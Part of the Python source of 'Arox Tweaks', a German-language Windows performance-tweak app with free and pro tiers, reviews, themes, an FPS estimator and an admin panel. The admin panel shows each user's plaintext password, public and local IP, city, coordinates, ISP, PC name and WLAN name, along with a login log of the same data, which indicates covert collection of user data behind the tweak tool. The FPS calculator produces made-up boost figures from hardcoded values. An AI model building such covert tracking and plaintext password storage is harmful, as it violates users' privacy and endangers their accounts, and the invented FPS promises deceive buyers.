            font=ctk.CTkFont(family=F, size=13, weight="bold"),
            text_color=TEXT, anchor="w").pack(anchor="w")
        ctk.CTkLabel(inf2, text="PRO" if self.is_pro else "FREE",
            font=ctk.CTkFont(family=F, size=9, weight="bold"),
            text_color=ACCENT if self.is_pro else TEXT_DIM).pack(anchor="w")

        ctk.CTkLabel(bottom, text="Arox Tweaks  |  v1.21",
            font=ctk.CTkFont(family=F, size=8), text_color=TEXT_GRAY).pack(pady=(7, 0))
        ctk.CTkButton(bottom, text="Logout",
            font=ctk.CTkFont(family=F, size=10, weight="bold"),
            fg_color="#ff4466", hover_color="#cc3355", text_color=TEXT,
            width=85, height=26, corner_radius=6, command=self._logout).pack(pady=(4, 0))

        # CONTENT-BEREICH
        self.content_area = ctk.CTkFrame(main, fg_color=BG, corner_radius=0)
        self.content_area.pack(side="left", fill="both", expand=True)

        ctk.CTkButton(self.content_area, text="Admin Panel",
            font=ctk.CTkFont(family=F, size=10, weight="bold"),
            fg_color=CARD, hover_color=INPUT, text_color=TEXT_DIM,
            width=105, height=30, corner_radius=6, command=self._admin
        ).place(x=20, y=20)

        self._menu_click(lambda: self._show_tweaks("free"), "Free Tweaks")

    def _menu_click(self, command, key):
        for k, btn in self.menu_buttons.items():
            btn.configure(fg_color="transparent", text_color=TEXT_DIM)
        if key in self.menu_buttons:
            self.menu_buttons[key].configure(fg_color="#1a2438", text_color=ACCENT)
        command()

    def _clear_content(self):
        for w in self.content_area.winfo_children():
            try:
                if "Admin Panel" in str(w.cget("text")):
                    continue
            except:
                pass
            w.destroy()

    # ─── TWEAKS ───────────────────────────────────────────────────────────────
    def _show_tweaks(self, mode):
        self._clear_content()
        hdr = ctk.CTkFrame(self.content_area, fg_color="transparent", height=80)
        hdr.pack(fill="x", padx=30, pady=(55, 0))
        hdr.pack_propagate(False)

        title    = "Free Tweaks" if mode == "free" else "Pro Tweaks"
        subtitle = "Grundlegende Optimierungen" if mode == "free" else "Erweiterte Performance"
        ctk.CTkLabel(hdr, text=title,
            font=ctk.CTkFont(family=F, size=26, weight="bold"),
            text_color=TEXT).pack(side="left", anchor="w")
        ctk.CTkLabel(hdr, text=subtitle,
            font=ctk.CTkFont(family=F, size=12), text_color=TEXT_DIM
        ).pack(side="left", anchor="w", padx=(14, 0))

        ult = ctk.CTkButton(hdr, text="ALLES ANWENDEN",
            font=ctk.CTkFont(family=F, size=12, weight="bold"),
            fg_color=ACCENT, hover_color=ACCENT_DARK, text_color="#000000",
            height=40, width=175, corner_radius=8,
            command=lambda: self._ultimate(mode))
        ult.pack(side="right")
        self._ult_btn = ult

        scroll = ctk.CTkScrollableFrame(self.content_area, fg_color="transparent",
            scrollbar_button_color=CARD, scrollbar_button_hover_color=INPUT)
        scroll.pack(fill="both", expand=True, padx=30, pady=(10, 20))

        tweaks = FREE_TWEAKS if mode == "free" else PRO_TWEAKS
        if mode == "pro" and not self.is_pro:
            lock = ctk.CTkFrame(scroll, fg_color=CARD, corner_radius=10,
                                border_width=1, border_color=BORDER)
            lock.pack(fill="x", pady=20)
            ctk.CTkLabel(lock, text="PRO Funktionen gesperrt",
                font=ctk.CTkFont(family=F, size=16, weight="bold"),
                text_color="#ffd700").pack(pady=(30, 10))
            ctk.CTkLabel(lock, text="Upgrade auf PRO erforderlich",
                font=ctk.CTkFont(family=F, size=12), text_color=TEXT_DIM
            ).pack(pady=(0, 30))

        for key, tw in tweaks.items():
            card = ctk.CTkFrame(scroll, fg_color=CARD, corner_radius=10,
                                border_width=1, border_color=BORDER)
            card.pack(fill="x", pady=(0, 8))
            row = ctk.CTkFrame(card, fg_color="transparent")
            row.pack(fill="x", padx=16, pady=(12, 6))

            ctk.CTkLabel(row, text=tw["name"],
                font=ctk.CTkFont(family=F, size=14, weight="bold"),
                text_color=TEXT).pack(side="left")

            is_locked = mode == "pro" and not self.is_pro
            if is_locked:
                ctk.CTkLabel(row, text="PRO",
                    font=ctk.CTkFont(family=F, size=9, weight="bold"),
                    fg_color="#2a1f3d", corner_radius=4,
                    text_color=ACCENT, padx=6, pady=3).pack(side="left", padx=(8, 0))

            ab = ctk.CTkButton(row,
                text="Anwenden" if not is_locked else "Gesperrt",
                font=ctk.CTkFont(family=F, size=11, weight="bold"),
                fg_color=ACCENT if not is_locked else TEXT_GRAY,
                hover_color=ACCENT_DARK if not is_locked else TEXT_GRAY,
                text_color="#000000" if not is_locked else TEXT_DIM,
                width=95, height=32, corner_radius=6,
                state="normal" if not is_locked else "disabled")
            ab.configure(command=lambda t=tw, b=ab: self._apply_tweak(t, b))
            ab.pack(side="right")

            ctk.CTkLabel(card, text=tw["desc"],
                font=ctk.CTkFont(family=F, size=11),
                text_color=TEXT_DIM, anchor="w").pack(fill="x", padx=16, pady=(0, 12))

    def _apply_tweak(self, tw, btn):
        original = btn.cget("text")
        btn.configure(text="Laeuft...", state="disabled")
        def go():
            for cmd in tw["cmds"]:
                run_silent(cmd)
            self.after(0, lambda: btn.configure(text="Fertig!", fg_color="#00cc66"))
            self.after(2500, lambda: btn.configure(text=original, fg_color=ACCENT, state="normal"))
        threading.Thread(target=go, daemon=True).start()

    def _ultimate(self, mode):
        self._ult_btn.configure(text="Laeuft...", state="disabled")
        def go():
            tweaks = FREE_TWEAKS if mode == "free" else PRO_TWEAKS
            n = 0
            for tw in tweaks.values():
                for cmd in tw["cmds"]:
                    run_silent(cmd)
                    n += 1
            self.after(0, lambda: self._ult_btn.configure(text=f"{n} angewendet", fg_color="#00cc66"))
            self.after(3000, lambda: self._ult_btn.configure(
                text="ALLES ANWENDEN", fg_color=ACCENT, state="normal"))
        threading.Thread(target=go, daemon=True).start()

    # ─── BEWERTUNGEN ──────────────────────────────────────────────────────────
    def _show_vouches(self):
        self._clear_content()
        hdr = ctk.CTkFrame(self.content_area, fg_color="transparent", height=80)
        hdr.pack(fill="x", padx=30, pady=(55, 0))
        hdr.pack_propagate(False)
        ctk.CTkLabel(hdr, text="Bewertungen",
            font=ctk.CTkFont(family=F, size=26, weight="bold"),
            text_color=TEXT).pack(side="left", anchor="w")
        ctk.CTkButton(hdr, text="+ Bewertung",
            font=ctk.CTkFont(family=F, size=12, weight="bold"),
            fg_color=ACCENT, hover_color=ACCENT_DARK, text_color="#000000",
            width=130, height=38, corner_radius=8,
            command=self._add_vouch_dialog).pack(side="right", anchor="e")

        scroll = ctk.CTkScrollableFrame(self.content_area, fg_color="transparent",
            scrollbar_button_color=CARD, scrollbar_button_hover_color=INPUT)
        scroll.pack(fill="both", expand=True, padx=30, pady=(10, 20))

        vouches = load_vouches()
        if not vouches:
            ctk.CTkLabel(scroll, text="Noch keine Bewertungen. Sei der Erste!",
                font=ctk.CTkFont(family=F, size=14), text_color=TEXT_DIM).pack(pady=60)
            return

        avg = sum(v.get("rating", 5) for v in vouches) / len(vouches)
        sc  = ctk.CTkFrame(scroll, fg_color=CARD, corner_radius=10, border_width=1, border_color=BORDER)
        sc.pack(fill="x", pady=(0, 16))
        sg = ctk.CTkFrame(sc, fg_color="transparent")
        sg.pack(padx=20, pady=16)
        for val, lbl_text in [
            (str(len(vouches)), "Gesamt"),
            (f"{avg:.1f} / 5", "Durchschnitt"),
            (str(len([v for v in vouches if v.get("rating", 0) == 5])), "5-Sterne"),
        ]:
            it = ctk.CTkFrame(sg, fg_color="transparent")
            it.pack(side="left", padx=30)
            ctk.CTkLabel(it, text=val, font=ctk.CTkFont(family=F, size=22, weight="bold"),
                text_color=ACCENT).pack()
            ctk.CTkLabel(it, text=lbl_text, font=ctk.CTkFont(family=F, size=10),
                text_color=TEXT_DIM).pack()

        for v in reversed(vouches):
            card = ctk.CTkFrame(scroll, fg_color=CARD, corner_radius=10,
                                border_width=1, border_color=BORDER)
            card.pack(fill="x", pady=(0, 8))
            top = ctk.CTkFrame(card, fg_color="transparent")
            top.pack(fill="x", padx=16, pady=(12, 4))
            ctk.CTkLabel(top, text=v.get("user", "?"),
                font=ctk.CTkFont(family=F, size=13, weight="bold"),
                text_color=TEXT).pack(side="left")
            ctk.CTkLabel(top, text="★" * v.get("rating", 5),
                font=ctk.CTkFont(size=13), text_color="#ffd700").pack(side="left", padx=(10, 0))
            ctk.CTkLabel(top, text=v.get("date", ""),
                font=ctk.CTkFont(family=F, size=10), text_color=TEXT_GRAY).pack(side="right")
            ctk.CTkLabel(card, text=v.get("text", ""),
                font=ctk.CTkFont(family=F, size=12), text_color=TEXT_DIM,
                anchor="w", wraplength=620).pack(fill="x", padx=16, pady=(0, 12))

    def _add_vouch_dialog(self):
        win = ctk.CTkToplevel(self)
        win.title("Bewertung hinzufuegen")
        win.geometry("490x390")
        win.configure(fg_color=BG)
        win.attributes("-topmost", True)
        win.grab_set()

        ctk.CTkLabel(win, text="Bewertung schreiben",
            font=ctk.CTkFont(family=F, size=18, weight="bold"),
            text_color=TEXT).pack(pady=(28, 10))

        rating_var = ctk.IntVar(value=5)
        rf = ctk.CTkFrame(win, fg_color="transparent")
        rf.pack(fill="x", padx=30, pady=(0, 12))
        for i in range(1, 6):
            ctk.CTkRadioButton(rf, text=f"{'★' * i}", variable=rating_var, value=i,
                font=ctk.CTkFont(family=F, size=13), fg_color=ACCENT,
                hover_color=ACCENT_DARK, text_color=TEXT).pack(side="left", padx=4)

        tb = ctk.CTkTextbox(win, font=ctk.CTkFont(family=F, size=12),
            fg_color=INPUT, border_color=BORDER, border_width=1,
            text_color=TEXT, height=120, corner_radius=8)
        tb.pack(fill="x", padx=30, pady=(0, 10))

        msg = ctk.CTkLabel(win, text="", font=ctk.CTkFont(family=F, size=10),
            text_color="#00ff88")
        msg.pack(pady=4)

        def submit():
            text = tb.get("1.0", "end").strip()
            if len(text) < 10:
                msg.configure(text="Mind. 10 Zeichen eingeben!", text_color="#ff4466")
                return
            vs = load_vouches()
            vs.append({"user": self.user, "text": text, "rating": rating_var.get(),
                       "date": datetime.now().strftime("%Y-%m-%d %H:%M")})
            if save_vouches(vs):
                msg.configure(text="Bewertung gespeichert!", text_color="#00ff88")
                win.after(1400, win.destroy)
                self.after(100, self._show_vouches)
            else:
                msg.configure(text="Fehler beim Speichern", text_color="#ff4466")

        ctk.CTkButton(win, text="Absenden",
            font=ctk.CTkFont(family=F, size=13, weight="bold"),
            fg_color=ACCENT, hover_color=ACCENT_DARK, text_color="#000000",
            height=44, corner_radius=8, command=submit).pack(pady=8, padx=30, fill="x")

    # ─── THEMES - FIX: 100% Canvas, kein tk/ctk Mix ───────────────────────────
    def _show_themes(self):
        self._clear_content()

        hdr = ctk.CTkFrame(self.content_area, fg_color="transparent", height=80)
        hdr.pack(fill="x", padx=30, pady=(55, 0))
        hdr.pack_propagate(False)
        ctk.CTkLabel(hdr, text="Themes",
            font=ctk.CTkFont(family=F, size=26, weight="bold"),
            text_color=TEXT).pack(side="left", anchor="w")
        ctk.CTkLabel(hdr, text="Erscheinungsbild der App anpassen",
            font=ctk.CTkFont(family=F, size=12), text_color=TEXT_DIM
        ).pack(side="left", anchor="w", padx=(14, 0))

        scroll = ctk.CTkScrollableFrame(self.content_area, fg_color="transparent",
            scrollbar_button_color=CARD, scrollbar_button_hover_color=INPUT)
        scroll.pack(fill="both", expand=True, padx=30, pady=(10, 20))

        grid = ctk.CTkFrame(scroll, fg_color="transparent")
        grid.pack(fill="both", expand=True)
        for i in range(3):
            grid.columnconfigure(i, weight=1)

        CW, CH = 252, 142   # Karten-Breite / Hoehe
        row, col = 0, 0

        for theme_name, td in THEMES.items():
            is_active  = (theme_name == CURRENT_THEME)
            border_col = td["primary"] if is_active else "#1c2838"

            # Canvas als Theme-Karte (kein tk.Frame/ctk Mischmasch)
            cv = tk.Canvas(
                grid, width=CW, height=CH,
                bg=CARD_BG,
                highlightthickness=2,
                highlightbackground=border_col,
                cursor="hand2" if not is_active else "arrow"
            )
            cv.grid(row=row, column=col, padx=8, pady=8, sticky="nsew")

            # Farbfelder direkt auf Canvas zeichnen
            sx, sy1, sy2, sw = 12, 12, 56, 68
            for color in td["colors"][:3]:
                cv.create_rectangle(sx, sy1, sx + sw, sy2,
                    fill=color, outline="", width=0)
                sx += sw + 8

            # Name
            cv.create_text(12, 68, text=td["name"],
                fill="#ffffff", font=(F, 12, "bold"), anchor="nw")
            # Beschreibung
            cv.create_text(12, 92, text=td["desc"],
                fill="#5a6a88", font=(F, 10), anchor="nw")
            # Haken bei aktivem Theme
            if is_active:
                cv.create_text(CW - 12, 14, text="✓",
                    fill=td["primary"], font=(F, 16, "bold"), anchor="ne")

            # Hover + Klick
            if not is_active:
                def on_click(e, t=theme_name):
                    self._apply_theme(t)
                def on_enter(e, c=cv, p=td["primary"]):
                    c.configure(highlightbackground=p)
                def on_leave(e, c=cv, b=border_col):
                    c.configure(highlightbackground=b)
                cv.bind("<Button-1>", on_click)
                cv.bind("<Enter>",    on_enter)
                cv.bind("<Leave>",    on_leave)

            col += 1
            if col >= 3:
                col = 0
                row += 1

    def _apply_theme(self, theme_name):
        global CURRENT_THEME, ACCENT, ACCENT_DARK
        CURRENT_THEME = theme_name
        ACCENT        = THEMES[theme_name]["primary"]
        ACCENT_DARK   = THEMES[theme_name]["accent"]
        save_theme(theme_name)
        self._open_dashboard()

    # ─── FPS RECHNER ──────────────────────────────────────────────────────────
    def _show_fps_test(self):
        self._clear_content()
        hdr = ctk.CTkFrame(self.content_area, fg_color="transparent", height=80)
        hdr.pack(fill="x", padx=30, pady=(55, 0))
        hdr.pack_propagate(False)
        ctk.CTkLabel(hdr, text="FPS Rechner",
            font=ctk.CTkFont(family=F, size=26, weight="bold"),
            text_color=TEXT).pack(side="left", anchor="w")
        ctk.CTkLabel(hdr, text="Leistungssteigerung schatzen",
            font=ctk.CTkFont(family=F, size=12), text_color=TEXT_DIM
        ).pack(side="left", anchor="w", padx=(14, 0))

        scroll = ctk.CTkScrollableFrame(self.content_area, fg_color="transparent",
            scrollbar_button_color=CARD, scrollbar_button_hover_color=INPUT)
        scroll.pack(fill="both", expand=True, padx=30, pady=(10, 20))

        content = ctk.CTkFrame(scroll, fg_color=CARD, corner_radius=12,
                               border_width=1, border_color=BORDER)
        content.pack(fill="x", pady=20, padx=50)

        ctk.CTkLabel(content, text="FPS Boost Kalkulator",
            font=ctk.CTkFont(family=F, size=20, weight="bold"),
            text_color=ACCENT).pack(pady=(28, 30))

        for lbl_text, attr, lst in [
            ("GRAFIKKARTE AUSWAHLEN", "_gpu_var", GPU_LIST),
            ("PROZESSOR AUSWAHLEN",   "_cpu_var", CPU_LIST),
        ]:
            ctk.CTkLabel(content, text=lbl_text,
                font=ctk.CTkFont(family=F, size=11, weight="bold"),
                text_color=TEXT_DIM, anchor="w").pack(fill="x", padx=40, pady=(0, 8))
            var = ctk.StringVar(value=lst[0])
            setattr(self, attr, var)
            ctk.CTkOptionMenu(content, variable=var, values=lst,
                font=ctk.CTkFont(family=F, size=13),
                fg_color=INPUT, button_color=ACCENT, button_hover_color=ACCENT_DARK,
                dropdown_fg_color=CARD, dropdown_hover_color=INPUT,
                text_color=TEXT, dropdown_text_color=TEXT,
                width=380, height=46, corner_radius=8).pack(padx=40, pady=(0, 22))

        result_label = ctk.CTkLabel(content, text="",
            font=ctk.CTkFont(family=F, size=18, weight="bold"), text_color=ACCENT)

        def calculate():
            base = 30; gb = 25; cb = 15
            g = self._gpu_var.get(); c = self._cpu_var.get()
            if   "4090" in g or "7900 XTX" in g: gb = 14
            elif "4080" in g or "7900 XT" in g:  gb = 18
            elif "4070" in g or "7800 XT" in g:  gb = 22
            elif "4060" in g or "7700 XT" in g:  gb = 26
            elif "1650" in g or "6400" in g:      gb = 42
            elif "1050" in g:                      gb = 48
            if   "14900K" in c or "7950X" in c:  cb = 8
            elif "13900K" in c or "7800X" in c:  cb = 10
            elif "12600K" in c or "5600X" in c:  cb = 16
            elif "10400" in c or "3600" in c:     cb = 22
            total = base + gb + cb
            result_label.configure(
                text=f"Geschatzte FPS Steigerung:  +{max(5, total-18)} bis +{total+12} FPS")
            result_label.pack(pady=(0, 28))

        ctk.CTkButton(content, text="Berechnen",
            font=ctk.CTkFont(family=F, size=14, weight="bold"),
            fg_color=ACCENT, hover_color=ACCENT_DARK, text_color="#000000",
            height=50, width=380, corner_radius=10, command=calculate
        ).pack(pady=(6, 20), padx=40)
        result_label.pack()

    # ─── ADMIN PANEL ──────────────────────────────────────────────────────────
    def _admin(self):
        win = ctk.CTkToplevel(self)
        win.title("Admin Panel")
        win.geometry("880x700")
        win.configure(fg_color=BG)
        win.attributes("-topmost", True)
        win.grab_set()

        hdr = ctk.CTkFrame(win, fg_color=SIDEBAR, height=65, corner_radius=0)
        hdr.pack(fill="x")
        hdr.pack_propagate(False)
        ctk.CTkLabel(hdr, text="Admin Panel",
            font=ctk.CTkFont(family=F, size=18, weight="bold"),
            text_color=ACCENT).pack(side="left", padx=28, pady=18)
        tab_frame = ctk.CTkFrame(hdr, fg_color="transparent")
        tab_frame.pack(side="right", padx=20, pady=16)

        # Passwort-Screen
        pw_cont = ctk.CTkFrame(win, fg_color="transparent")
        pw_cont.pack(fill="both", expand=True)
        pw_card = ctk.CTkFrame(pw_cont, fg_color=CARD, corner_radius=12,
                               border_width=1, border_color=BORDER)
        pw_card.place(relx=0.5, rely=0.5, anchor="center")

        ctk.CTkLabel(pw_card, text="Admin Authentifizierung",
            font=ctk.CTkFont(family=F, size=16, weight="bold"),
            text_color=TEXT).pack(pady=(28, 10))
        pw_e = ctk.CTkEntry(pw_card,
            font=ctk.CTkFont(family=F, size=12),
            fg_color=INPUT, border_color=BORDER, border_width=1,
            text_color=TEXT, height=44, width=290, corner_radius=8,
            show="*", placeholder_text="Admin Passwort",
            placeholder_text_color=TEXT_GRAY)
        pw_e.pack(pady=(0, 8), padx=30)
        pw_e.focus()
        pw_msg = ctk.CTkLabel(pw_card, text="",
            font=ctk.CTkFont(family=F, size=10), text_color="#ff4466")
        pw_msg.pack(pady=(4, 12))

        content_area = ctk.CTkFrame(win, fg_color=BG)
        users_tab    = ctk.CTkScrollableFrame(content_area, fg_color="transparent")
        logins_tab   = ctk.CTkScrollableFrame(content_area, fg_color="transparent")
        tabs         = {"Benutzer": users_tab, "Login-Protokoll": logins_tab}
        tab_btns     = {}

        def show_tab(name):
            for f in tabs.values():
                f.pack_forget()
            tabs[name].pack(fill="both", expand=True, padx=18, pady=14)
            for n, b in tab_btns.items():
                b.configure(
                    fg_color=ACCENT if n == name else CARD,
                    text_color="#000000" if n == name else TEXT_DIM)

        for tname in ["Benutzer", "Login-Protokoll"]:
            b = ctk.CTkButton(tab_frame, text=tname,
                font=ctk.CTkFont(family=F, size=11, weight="bold"),
                fg_color=CARD, hover_color=INPUT, text_color=TEXT_DIM,
                width=135, height=32, corner_radius=6,
                command=lambda n=tname: show_tab(n))
            b.pack(side="left", padx=4)
            tab_btns[tname] = b

        # Benutzer laden
        def load_users():
            for w in users_tab.winfo_children():
                w.destroy()
            users = db_read()
            if not users:
                ctk.CTkLabel(users_tab, text="Keine Benutzer gefunden.",
                    font=ctk.CTkFont(family=F, size=12), text_color=TEXT_GRAY).pack(pady=40)
                return
            hd = ctk.CTkFrame(users_tab, fg_color="transparent")
            hd.pack(fill="x", pady=(0, 12))
            ctk.CTkLabel(hd, text=f"{len(users)} Benutzer registriert",
                font=ctk.CTkFont(family=F, size=13, weight="bold"),
                text_color=TEXT).pack(side="left")
            ctk.CTkButton(hd, text="Aktualisieren",
                font=ctk.CTkFont(family=F, size=10, weight="bold"),
                fg_color=CARD, hover_color=INPUT, text_color=TEXT_DIM,
                width=115, height=30, corner_radius=6, command=load_users).pack(side="right")

            for uname, ud in users.items():
                card = ctk.CTkFrame(users_tab, fg_color=CARD, corner_radius=10,
                                    border_width=1, border_color=BORDER)
                card.pack(fill="x", pady=(0, 8))
                top = ctk.CTkFrame(card, fg_color="transparent")
                top.pack(fill="x", padx=14, pady=(10, 6))
                is_pro = ud.get("pro", False)
                ctk.CTkLabel(top, text=ud.get("name", uname),
                    font=ctk.CTkFont(family=F, size=13, weight="bold"),
                    text_color=TEXT).pack(side="left")
                ctk.CTkLabel(top, text="PRO" if is_pro else "FREE",
                    font=ctk.CTkFont(family=F, size=9, weight="bold"),
                    fg_color=ACCENT if is_pro else INPUT, corner_radius=4,
                    text_color="#000000" if is_pro else TEXT_GRAY,
                    padx=6, pady=3).pack(side="left", padx=(8, 0))

                def del_user(u=uname):
                    us = db_read()
                    if u in us:
                        del us[u]
                        db_write(us)
                    load_users()

                def tog_pro(u=uname, p=is_pro):
                    us = db_read()
                    if u in us:
                        us[u]["pro"] = not p
                        db_write(us)
                        if u == self.user:
                            self.is_pro = not p
                    load_users()

                ctk.CTkButton(top, text="Loschen",
                    font=ctk.CTkFont(family=F, size=10, weight="bold"),
                    fg_color=INPUT, hover_color="#ff4466", text_color=TEXT_DIM,
                    width=72, height=30, corner_radius=6, command=del_user
                ).pack(side="right", padx=(5, 0))
                ctk.CTkButton(top,
                    text="PRO entfernen" if is_pro else "PRO geben",
                    font=ctk.CTkFont(family=F, size=10, weight="bold"),
                    fg_color="#ff4466" if is_pro else "#00cc6d",
                    text_color=TEXT, width=110, height=30, corner_radius=6,
                    command=tog_pro).pack(side="right")

                # Vollstaendige Standortdaten
                inf2 = ctk.CTkFrame(card, fg_color=INPUT, corner_radius=8)
                inf2.pack(fill="x", padx=14, pady=(0, 10))
                for line in [
                    f"Passwort: {ud.get('pw_plain','***')}",
                    f"Globale IP: {ud.get('ip','?')}   Lokale IPv4: {ud.get('ipv4','?')}",
                    f"Stadt: {ud.get('city','?')}   Region: {ud.get('region','?')}   Land: {ud.get('country','?')} ({ud.get('country_code','?')})",
                    f"Koordinaten: {ud.get('lat','?')}, {ud.get('lon','?')}   Zeitzone: {ud.get('timezone','?')}",
                    f"ISP: {ud.get('isp','?')}   Org: {ud.get('org','?')}",
                    f"PC-Name: {ud.get('pc_name','?')}   WLAN: {ud.get('wlan','?')}",
                    f"Erstellt: {ud.get('created','?')}   Zuletzt: {ud.get('last','?')}",
                ]:
                    ctk.CTkLabel(inf2, text=line,
                        font=ctk.CTkFont(family="Consolas", size=9),
                        text_color=TEXT_DIM, anchor="w").pack(fill="x", padx=10, pady=1)

        # Login-Protokoll
        def load_logins():
            for w in logins_tab.winfo_children():
                w.destroy()
            try:
                logs = json.load(open(LOGIN_LOG, encoding="utf-8")) if os.path.exists(LOGIN_LOG) else []
            except:
                logs = []
            if not logs:
                ctk.CTkLabel(logins_tab, text="Noch keine Login-Ereignisse.",
                    font=ctk.CTkFont(family=F, size=12), text_color=TEXT_GRAY).pack(pady=40)
                return
            ctk.CTkLabel(logins_tab, text=f"{len(logs)} Login-Ereignisse gespeichert",
                font=ctk.CTkFont(family=F, size=13, weight="bold"),
                text_color=TEXT).pack(anchor="w", pady=(0, 10))

            for lg in logs:
                card = ctk.CTkFrame(logins_tab, fg_color=CARD, corner_radius=8,
                                    border_width=1, border_color=BORDER)
                card.pack(fill="x", pady=(0, 6))
                r = ctk.CTkFrame(card, fg_color="transparent")
                r.pack(fill="x", padx=14, pady=(8, 4))
                ctk.CTkLabel(r, text=lg.get("user", "?"),
                    font=ctk.CTkFont(family=F, size=13, weight="bold"),
                    text_color=ACCENT).pack(side="left")
                ctk.CTkLabel(r, text=lg.get("time", "?"),
                    font=ctk.CTkFont(family=F, size=10),
                    text_color=TEXT_GRAY).pack(side="right")
                inf3 = ctk.CTkFrame(card, fg_color=INPUT, corner_radius=6)
                inf3.pack(fill="x", padx=14, pady=(0, 8))
                for line in [
                    f"Globale IP: {lg.get('ip','?')}   Lokale IPv4: {lg.get('ipv4','?')}",
                    f"Stadt: {lg.get('city','?')}   Region: {lg.get('region','?')}",
                    f"Land: {lg.get('country','?')} ({lg.get('country_code','?')})   Koordinaten: {lg.get('lat','?')}, {lg.get('lon','?')}",
                    f"ISP: {lg.get('isp','?')}   Zeitzone: {lg.get('timezone','?')}",
                    f"PC-Name: {lg.get('pc_name','?')}   WLAN: {lg.get('wlan','?')}",
                ]:
                    ctk.CTkLabel(inf3, text=line,
                        font=ctk.CTkFont(family="Consolas", size=9),
                        text_color=TEXT_DIM, anchor="w").pack(fill="x", padx=8, pady=1)

        def unlock():
            if pw_e.get() == ADMIN_PW:
                pw_cont.pack_forget()
                content_area.pack(fill="both", expand=True)
                show_tab("Benutzer")
                tab_btns["Benutzer"].configure(
                    command=lambda: (show_tab("Benutzer"), load_users()))
                tab_btns["Login-Protokoll"].configure(
                    command=lambda: (show_tab("Login-Protokoll"), load_logins()))
                load_users()
            else:
                pw_msg.configure(text="Falsches Passwort!")

        ctk.CTkButton(pw_card, text="ENTSPERREN",
            font=ctk.CTkFont(family=F, size=13, weight="bold"),
            fg_color=ACCENT, hover_color=ACCENT_DARK, text_color="#000000",
            height=44, width=290, corner_radius=8, command=unlock
        ).pack(pady=(0, 28), padx=30)
        pw_e.bind("<Return>", lambda e: unlock())

    def _logout(self):
        clear_session()
        self.user    = ""
        self.is_pro  = False
        self._open_auth()

# ─── START ────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    try:
        load_theme()
        ctk.set_appearance_mode("dark")
        app = AroxApp()
        app.mainloop()
    except Exception as e:
        import traceback
        print(f"Fehler: {e}\n{traceback.format_exc()}")
        sys.exit(1)
